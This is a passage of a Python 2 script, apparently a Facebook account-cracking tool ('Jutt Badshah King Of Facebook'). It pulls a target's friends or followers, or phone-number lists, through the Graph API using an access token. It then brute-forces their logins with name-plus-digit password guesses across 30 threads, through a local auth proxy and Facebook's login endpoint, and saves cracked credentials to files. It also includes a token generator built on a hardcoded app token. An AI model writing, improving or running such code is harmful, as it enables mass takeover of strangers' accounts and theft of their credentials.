    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    nc_s()


def nc_s():
    id = []
    cps = []
    oks = []
    n_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if n_s == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Name + Digit Pass public cracking~~~~\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~Name + Number Pass Public Cracking~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input(' \x1b[1;92mPress enter to try again \x1b[1;97m')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif n_s == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~Name Pass Followers Cracking ~~~\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~ Name + Digit Pass Followers Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again \x1b[1;97m')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif n_s == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Name + Digit Pass File Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. \x1b[1;97m')
            name_crack()

    elif n_s == '0':
        menu()
    else:
        print ('')
        print ('\x1b[1;37mChoose valid option')
        nc_s()
    print (' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id)))
    time.sleep(0.5)
    print ('\033[1;97mCrack Running\033[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = name.lower() + p1
            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                ok = open('JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    ok = open('JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        ok = open('JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            ok = open('JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print (' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\x1b[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[1;97m')
    menu()


def digit_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\t Login FB id to continue\x1b[0;97m')
        print ('')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print("")
    print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Name Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    dc_s()


def dc_s():
    id = []
    cps = []
    oks = []
    d_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Jutt\xe2\x9e\xa4 ')
    if d_s == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Name Pass Public Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96mFor example:123,1234,12345,786,12,1122\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~Name Pass Public Cracking~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input(' \x1b[1;92mPress enter to try again \x1b[1;97m')
            digit_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif d_s == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Name Pass Followers Cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print (' \x1b[1;96mFor example:123,1234,12345,786,12,1122\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~Name Pass Followers Cracking~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again \x1b[1;97m')
            digit_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif d_s == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Name Pass File Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96mFor example:123,1234,12345,786,12,1122\x1b[1;97m')
        print (47 * '-')
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        try:
            idlist = raw_input('\x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. \x1b[1;97m')
            digit_crack()

    elif d_s == '0':
        menu()
    else:
        print ('')
        print ('\x1b[1;37mChoose valid option')
        dc_s()
    print ('\x1b[1;92m Total ids: ' + str(len(id)))
    time.sleep(0.5)
    print (' \x1b[1;97mCrack Running\x1b[1;97m ')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = name.lower() + p1
            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print (' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\033[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[1;97m')
    menu()


def gen_token():
    os.system("clear")
    print(logo)
    print("")
    print("\033[1;93m~~~~~~Generate FB Token~~~~~~\033[0;97m")
    print(47*'-')
    print("\033[0;93mNote: Token Generate Only New Accounts\033[0;97m")
    print("\033[0;93mDont Try On Personal Or Old Account\033[0;97m")
    print(47*"-")
    uid = raw_input("\033[1;96mID/Email/Number:\033[0;97m")
    passw = raw_input("\033[1;93mPassword:\033[0;97m")
    data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true").text
    q = json.loads(data)
    if "access_token" in q:
        print("")
        print("")
        print("\033[1;32mYour Access Token: \033[0;97m"+q["access_token"]+"\n\n")
        raw_input("\033[1;92mPress enter to back ")
        log_menu()
    elif "www.facebook.com" in q["error_msg"]:
        print(" ")
        print("\tAccount has checkpoint")
        print("")
        raw_input("\033[1;92mPress enter to back")
        log_menu()
    else:
        print("")
        print("\tID/number/pass may be wrong")
        print("")
        raw_input("\033[1;92mPress enter to back\033[0;97m")
        log_menu()


def ran():
    id=[]
    cps=[]
    oks=[]
    os.system("clear")
    print(logo)
    print("")
    print("\033[1;93m~~~~~Random Number Cloning~~~~~")
    print(47*'-')
    print("\033[1;92m[1]Pakistan idz Cloning\n")
    print("\033[1;92m[2]indian idz Cloning\n")
    print("\033[1;92m[3]Join My WP Group\n")
    print("\033[1;92m[0]Back\033[1;97m")
    print("")
    print(47*'-')
    ran_sel()


def ran_sel():
    id=[]
    cps=[]
    oks=[]
    r_s = raw_input("\033[1;96mSelect Option:\033[0;97m")
    if r_s == "1":
        os.system("clear")
        print (logo)
        print("")
        print("\033[1;93mEnter Code 01 to 49\033[0;97m")
        print(47*"-")
        c = raw_input("\033[1;96mEnter code:\033[0;97m ")
        k = ("+923")
        try:
            file = (".txt")
            for line in open(file, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("\033[1;92mFile Not Found")
            raw_input("\033[1;92mPress Enter To Back")
            ran()
    elif r_s == "2":
        os.system("clear")
        print (logo)
        print("")
        print("\033[1;93m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578\033[0;97m")
        print("")
        print("\033[1;97mEnter 3 Digit Any Indian Number")
        print(47*"-")
        c = raw_input("\033[1;96mEnter code:\033[0;97m ")
        k = ("+91")
        try:
            file = (".txt")
            for line in open(file, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("\033[1;92mFile Not Found")
            raw_input("\033[1;92mPress Enter To Back")
            ran()
    elif r_s =="3":
        os.system("xdg-open https://chat.whatsapp.com/KLYQVGYDT1yEwbiVF532YY")
        ran()
    elif r_s =="0":
        main_menu()
    else:
        print("")
        print("\033[1;91mSelect Valid Option")
        ran_sel()
    xxx = str(len(id))
    print("\033[1;92mTotal numbers: "+xxx)
    time.sleep(0.5)
    print("\033[1;97mThe process has started")
    time.sleep(0.5)
    print("\033[1;97mPress ctrl + z to stop\033[1;97m")
    time.sleep(0.5)
    print(47*"-")
    print("\033[1;92m ~~~~~~Jutt Badshah King Of Facebook~~~~~~\033[1;97m")
    time.sleep(0.5)
    print(47*"-")
    print("")
    def main(arg):
        user=arg
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = "03"+c+user
            data = session.get('http://localhost:5000/auth?id=' + k+c+user + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if "loc" in q:
                print("\033[1;32m[JUTT-OK] "+k+c+user+" | "+pass1+"\033[0;97m")
                ok = open("/sdcard/ids/JUTT-OK-.txt", "a")
                ok.write(k+c+user+"|"+pass1+"\n")
                ok.close()
                oks.append(k+c+user+pass1)
            else:
                if "www.facebook.com" in q["error"]:
                    print("\033[1;34m[JUTT-CP] "+k+c+user+" | "+pass1+"\033[0;97m")
                    cp = open("/sdcard/ids/JUTT-CP.txt", "a")
                    cp.write(k+c+user+"|"+pass1+"\n")
                    cp.close()
                    cps.append(k+c+user+pass1)
                else:
                    pass2 = user
                    data = session.get('http://localhost:5000/auth?id=' + k+c+user + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if "access_token" in q:
                        print("\033[1;32m[JUTT-OK] "+k+c+user+" | "+pass2+"\033[0;97m")
                        ok = open("/sdcard/ids/JUTT-OK.txt", "a")
                        ok.write(k+c+user+"|" +pass2+"\n")
                        ok.close()
                        oks.append(k+c+user+pass2)
                    else:
                        if "www.facebook.com" in q["error_msg"]:
                            print("\033[1;34m[JUTT-CP] "+k+c+user+" | "+pass2+"\033[0;97m")
                            cp = open("/sdcard/ids/JUTT-CP.txt", "a")
                            cp.write(k+c+user+"|"+pass2+"\n")
                            cp.close()
                            cps.append(k+c+user+pass2)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print(47*"-")
    print("")
    print("\033[1;96mThe process has been completed")
    print("\033[1;92mTotal Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
    print(47*"\033[1;97m-")
    print("")
    raw_input("\033[1;92mPress enter to back\033[0;97m")
    main_menu()


def brand_menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ('')
        print (logo)
        print ('\x1b[1;31;1mLogin FB id to continue')
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print (logo)
        print ('')
        print ('\t Account Cheekpoint\x1b[0;97m')
        print ('')
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print (logo)
        print ('')
        print ('\t Turn on mobile data/wifi\x1b[0;97m')
        print ('')
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        brand_menu()

    os.system('clear')
    print (logo)
    tok = open('/data/data/com.termux/files/usr/share/doc/xz/examples/.‎‎xozofile', 'r').read()
    print ('  \x1b[1;92mLogged in user: \x1b[1;92m' + z)
    print (47 * '\x1b[1;97m-')
    print (' \x1b[1;94m Active token: \x1b[1;95m' + tok)
    print (47*"\033[1;97m-")
    print ("")
    print ("\033[1;93m~~~~~Without Localhost Cloning Menu~~~~~\033[1;97m")
    print (47*"-")
    print ("")
    print ('\x1b[1;92m[1] Crack with Auto Passw10')
    print ('\x1b[1;92m[2] Crack Choice Number Passw6')
    print ('\x1b[1;92m[3] Crack Choice Name + Number Passw8')
    print ('\x1b[1;92m[4] Make File Extract ids')
    print ('\033[1;92m[5] Join My WP Group\033[1;97m')
    print ('\033[1;92m[0] Back\033[1;97m')
    print ('')
    print (47*'-')
    print ('\033[1;93mFor Any Problem selct 5 And Join My WP Group\033[1;97m')
    print (47*'-')
    bm_s()


def bm_s():
    bs = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if bs == '1':
        jutt_crack()
    elif bs == '2':
        brand_crack()
    elif bs == '3':
        fast_crack()
    elif bs == '4':
        juttex_menu()
    elif bs == '5':
        os.system('xdg-open https://chat.whatsapp.com/D3Q3WpXWWbv4klHfVGZ4JK')
        brand_menu()
    elif bs == '0':
        jutt_menu()
    else:
        print ('')
        print ('\tSelect valid option')
        print ('')
        bm_s()


def jutt_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\t Login FB id to continue\x1b[0;97m')
        print ('')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print ("")
    print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Auto Pass cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    jc_s()


def jc_s():
    id = []
    cps = []
    oks = []
    j_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if j_s == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Auto pass public cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~~~Without Localhost Cloning Menu~~~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;93m~~~~Auto Pass Public Cracking~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input(' \x1b[1;92mPress enter to try again \x1b[1;97m')
            jutt_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
